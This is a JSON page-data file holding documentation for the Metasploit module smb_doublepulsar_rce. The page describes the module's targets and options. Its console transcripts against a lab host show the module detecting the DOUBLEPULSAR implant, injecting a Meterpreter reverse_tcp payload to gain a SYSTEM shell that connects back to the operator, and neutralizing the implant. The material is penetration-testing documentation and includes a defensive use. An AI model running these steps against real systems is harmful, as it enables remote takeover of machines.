{"componentChunkName":"component---src-templates-module-documentation-template-tsx","path":"/modules/documentation/exploit/windows/smb/smb_doublepulsar_rce","result":{"data":{"moduleMetadataJson":{"id":"daf374df-f742-5eb0-8e4d-8e59532f1733","name":"SMB DOUBLEPULSAR Remote Code Execution","fullname":"exploit/windows/smb/smb_doublepulsar_rce","description":"This module executes a Metasploit payload against the Equation Group's\n        DOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE.\n\n        While this module primarily performs code execution against the implant,\n        the \"Neutralize implant\" target allows you to disable the implant.","rank":500,"fields":{"detailsSlug":"/modules/details/exploit/windows/smb/smb_doublepulsar_rce","documentationSlug":"/modules/documentation/exploit/windows/smb/smb_doublepulsar_rce","referencesSlug":"/modules/references/exploit/windows/smb/smb_doublepulsar_rce"},"documentation":{"html":"<h2 id=\"introduction\" style=\"position:relative;\"><a href=\"#introduction\" aria-label=\"introduction permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Introduction</h2>\n<p>This module executes a Metasploit payload against the Equation Group's\nDOUBLEPULSAR implant for SMB as popularly deployed by ETERNALBLUE.</p>\n<p>While this module primarily performs code execution against the implant,\nthe <code class=\"language-text\">Neutralize implant</code> target allows you to disable the implant.</p>\n<h2 id=\"targets\" style=\"position:relative;\"><a href=\"#targets\" aria-label=\"targets permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Targets</h2>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">Id  Name\n--  ----\n0   Execute payload (x64)\n1   Neutralize implant</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span></span></pre></div>\n<h2 id=\"options\" style=\"position:relative;\"><a href=\"#options\" aria-label=\"options permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Options</h2>\n<p><strong>DefangedMode</strong></p>\n<p>Set this to <code class=\"language-text\">false</code> to disable defanged mode and enable module\nfunctionality. Set this only if you're SURE you want to proceed.</p>\n<p><strong>ProcessName</strong></p>\n<p>Set this to the userland process you want to inject the payload into.\nDefaults to <code class=\"language-text\">spoolsv.exe</code>.</p>\n<h2 id=\"usage\" style=\"position:relative;\"><a href=\"#usage\" aria-label=\"usage permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Usage</h2>\n<p>Pinging the implant:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/smb/smb_doublepulsar_rce) &gt; check\n\n[+] 192.168.56.115:445 - Connected to \\\\192.168.56.115\\IPC$ with TID = 2048\n[*] 192.168.56.115:445 - Target OS is Windows Server 2008 R2 Standard 7601 Service Pack 1\n[*] 192.168.56.115:445 - Sending ping to DOUBLEPULSAR\n[!] 192.168.56.115:445 - Host is likely INFECTED with DoublePulsar! - Arch: x64 (64-bit), XOR Key: 0x33C6DC64\n[+] 192.168.56.115:445 - The target is vulnerable.\nmsf5 exploit(windows/smb/smb_doublepulsar_rce) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Executing a payload:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/smb/smb_doublepulsar_rce) &gt; set target Execute\\ payload\ntarget =&gt; Execute payload\nmsf5 exploit(windows/smb/smb_doublepulsar_rce) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[+] 192.168.56.115:445 - Connected to \\\\192.168.56.115\\IPC$ with TID = 2048\n[*] 192.168.56.115:445 - Target OS is Windows Server 2008 R2 Standard 7601 Service Pack 1\n[*] 192.168.56.115:445 - Sending ping to DOUBLEPULSAR\n[!] 192.168.56.115:445 - Host is likely INFECTED with DoublePulsar! - Arch: x64 (64-bit), XOR Key: 0x33C6DC64\n[*] 192.168.56.115:445 - Generating kernel shellcode with windows/x64/meterpreter/reverse_tcp\n[*] 192.168.56.115:445 - Total shellcode length: 4096 bytes\n[*] 192.168.56.115:445 - Encrypting shellcode with XOR key 0x33C6DC64\n[*] 192.168.56.115:445 - Sending shellcode to DOUBLEPULSAR\n[+] 192.168.56.115:445 - Payload execution successful\n[*] Sending stage (206403 bytes) to 192.168.56.115\n[*] Meterpreter session 1 opened (192.168.56.1:4444 -&gt; 192.168.56.115:49158) at 2019-09-25 18:26:47 -0500\n\nmeterpreter &gt; getuid\nServer username: NT AUTHORITY\\SYSTEM\nmeterpreter &gt; sysinfo\nComputer        : WIN-S7TDBIENPVM\nOS              : Windows 2008 R2 (6.1 Build 7601, Service Pack 1).\nArchitecture    : x64\nSystem Language : en_US\nDomain          : WORKGROUP\nLogged On Users : 1\nMeterpreter     : x64/windows\nmeterpreter &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>\n<p>Neutralizing the implant:</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre style=\"counter-reset: linenumber NaN\" class=\"language-text line-numbers\"><code class=\"language-text\">msf5 exploit(windows/smb/smb_doublepulsar_rce) &gt; set target Neutralize\\ implant\ntarget =&gt; Neutralize implant\nmsf5 exploit(windows/smb/smb_doublepulsar_rce) &gt; run\n\n[*] Started reverse TCP handler on 192.168.56.1:4444\n[+] 192.168.56.115:445 - Connected to \\\\192.168.56.115\\IPC$ with TID = 2048\n[*] 192.168.56.115:445 - Target OS is Windows Server 2008 R2 Standard 7601 Service Pack 1\n[*] 192.168.56.115:445 - Sending ping to DOUBLEPULSAR\n[!] 192.168.56.115:445 - Host is likely INFECTED with DoublePulsar! - Arch: x64 (64-bit), XOR Key: 0x33C6DC64\n[*] 192.168.56.115:445 - Neutralizing DOUBLEPULSAR\n[+] 192.168.56.115:445 - Implant neutralization successful\n[*] Exploit completed, but no session was created.\nmsf5 exploit(windows/smb/smb_doublepulsar_rce) &gt;</code><span aria-hidden=\"true\" class=\"line-numbers-rows\" style=\"white-space: normal; width: auto; left: 0;\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></pre></div>"}}},"pageContext":{"id":"daf374df-f742-5eb0-8e4d-8e59532f1733"}}}